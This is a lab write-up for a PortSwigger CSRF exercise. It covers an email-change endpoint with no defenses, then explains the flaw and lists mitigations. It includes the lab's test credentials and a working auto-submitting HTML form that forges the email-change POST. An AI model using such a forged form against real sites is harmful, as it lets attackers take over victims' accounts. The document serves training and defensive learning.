# PortSwigger Lab Writeup

## Lab: CSRF Vulnerability with No Defenses

---

## Lab Overview
This lab demonstrates a Cross-Site Request Forgery (CSRF) vulnerability in the email change functionality.

The application does not implement any CSRF protection mechanisms, allowing attackers to trick authenticated users into performing unintended actions.

The objective is to craft a malicious HTML page that changes the victim’s email address.

---

## Objective
- Identify CSRF vulnerability  
- Craft a malicious request  
- Force victim to change email address  

---

## Tools Used
- Burp Suite  
- Web Browser  

---

## Exploitation Steps

1. Log in using provided credentials:
```
wiener:peter
```

2. Navigate to "My Account" and update the email  
3. Intercept the request using Burp Suite  

4. Observe the POST request:
```
POST /my-account/change-email
```

5. Generate a CSRF Proof of Concept (PoC) using Burp Suite  
   - Engagement tools → Generate CSRF PoC  
   - Enable auto-submit script  

6. Alternatively, create the following HTML exploit:

```html
<form method="POST" action="https://YOUR-LAB-ID.web-security-academy.net/my-account/change-email">
    <input type="hidden" name="email" value="attacker%40example.com">
</form>
<script>
    document.forms[0].submit();
</script>
```

7. Go to the exploit server  
8. Paste the HTML into the body and store it  
9. Test the exploit using "View exploit"  
10. Deliver the exploit to the victim  

---

## Screenshots


![Request](https://github.com/bunny4757/Cybersecurity/blob/main/Web-Security-Academy/Images/csrf_lab1.png)


![PoC](https://github.com/bunny4757/Cybersecurity/blob/main/Web-Security-Academy/Images/csrf_lab3.png)


![Result](https://github.com/bunny4757/Cybersecurity/blob/main/Web-Security-Academy/Images/csrf_lab4.png)

---

## Result

- The victim visits the malicious page  
- The browser automatically sends the forged request  
- The email address is changed without user consent  
- The attack succeeds due to lack of CSRF protection  

---

## Vulnerability Explanation

This vulnerability occurs due to absence of CSRF defenses.

### 1. No CSRF Token
The application does not include anti-CSRF tokens to validate requests.

### 2. Trust in Authenticated Requests
The server processes requests based solely on session cookies.

### 3. No Request Validation
There is no verification of request origin or intent.

As a result, attackers can perform actions on behalf of the user.

---

## Why the Attack Works

| Component | Effect |
|----------|--------|
| Authenticated session | Victim is already logged in |
| Hidden form | Sends forged request |
| Auto-submit script | Executes request automatically |
| No CSRF protection | Server accepts request |

---

## Mitigation Techniques

### 1. Use Anti-CSRF Tokens
- Include unique tokens in every sensitive request  
- Validate tokens on the server side  

### 2. SameSite Cookies
- Use `SameSite=Strict` or `Lax` to restrict cross-site requests  

### 3. Verify Origin/Referer Headers
- Validate request source before processing  

### 4. Require Re-authentication
- Ask for password confirmation for sensitive actions  

### 5. Use Secure Frameworks
- Built-in CSRF protection mechanisms  

---

## Key Takeaways
- CSRF exploits trust in authenticated sessions  
- Sensitive actions must be protected with tokens  
- Never rely only on cookies for authentication validation  

---

## Lab Status
Solved Successfully
